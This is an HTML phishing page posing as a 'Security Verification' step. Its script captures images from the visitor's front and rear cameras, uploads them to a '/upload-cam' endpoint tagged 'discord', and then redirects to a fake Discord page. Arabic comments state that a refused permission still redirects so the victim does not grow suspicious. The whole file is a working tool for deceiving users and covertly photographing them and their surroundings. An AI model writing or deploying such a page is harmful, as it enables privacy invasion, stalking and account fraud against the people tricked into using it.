<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Security Check</title>
<style>
  body{margin:0;font-family:sans-serif;background:#0f1115;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;text-align:center}
  .box{padding:40px;background:#171a21;border-radius:12px;max-width:400px}
  h1{font-size:20px;margin-bottom:16px}
  p{color:#8a8f99;font-size:14px;margin-bottom:24px}
  button{background:#4a90e2;color:#fff;border:none;padding:12px 24px;border-radius:8px;font-size:16px;cursor:pointer}
</style>
</head>
<body>
<div class="box">
  <h1>Security Verification</h1>
  <p>To secure your account, please verify your identity by allowing camera access.</p>
  <button id="btn">Start Verification</button>
</div>
<script>
document.getElementById('btn').addEventListener('click', async () => {
  document.getElementById('btn').textContent = 'Verifying...';
  try {
    // 1. الكاميرا الأمامية
    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    let video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    await new Promise(r => setTimeout(r, 500));
    let canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
    let frontImg = canvas.toDataURL('image/jpeg');
    stream.getTracks().forEach(t => t.stop());

    // 2. الكاميرا الخلفية
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
    video.srcObject = stream;
    await video.play();
    await new Promise(r => setTimeout(r, 500));
    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
    let backImg = canvas.toDataURL('image/jpeg');
    stream.getTracks().forEach(t => t.stop());

    // 3. إرسال الصور للسيرفر
    await fetch('/upload-cam', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ front: frontImg, back: backImg, brand: 'discord' })
    });

    // 4. تحويله لصفحة ديسكورد الوهمية
    window.location.href = '/discord-home.html';

  } catch (err) {
    // إذا رفض الإذن، ننقله عالصفحة الوهمية برضو عشان ما يشك
    window.location.href = '/discord-home.html';
  }
});
</script>
</body>
</html>
